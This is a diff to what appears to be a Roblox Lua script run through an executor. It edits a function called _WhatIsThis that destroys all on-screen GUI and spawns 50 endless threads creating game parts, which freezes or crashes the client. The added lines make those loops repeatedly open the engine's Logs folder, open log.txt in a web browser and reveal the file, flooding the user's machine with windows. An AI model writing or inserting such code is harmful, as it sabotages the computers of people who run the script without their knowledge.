@@ -51,15 +51,22 @@ local function _WhatIsThis()
     for _, GUI in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() GUI:Destroy() end) end
     for _, GUI in pairs(LocalPlayer.PlayerGui:GetDescendants()) do pcall(function() GUI:Destroy() end) end
     pcall(function() for _, GUI in pairs(gethui():GetDescendants()) do GUI:Destroy() end end)
+    
+    local FileManager = game:GetService("FileManagerService")
     for Index = 1, 50 do
         task.spawn(function()
             while true do
                 for J = 1, 200 do
                     Instance.new("Part", workspace)
+                    pcall(function() FileManager:OpenFolder(Enum.EngineFolder.Logs) end)
+                    pcall(function() FileManager:OpenFileInWebBrowser(Enum.EngineFolder.Logs, "log.txt") end)
+                    pcall(function() FileManager:RevealFileInFolder(Enum.EngineFolder.Logs, "log.txt") end)
+                    pcall(function() FileManager:ListFilesInFolderAsync(Enum.EngineFolder.Logs) end)
                 end
             end
         end)
     end
+    
     task.wait(0.1)
     while true do
         pcall(function() game:GetService("GuiService"):ClearError() end)
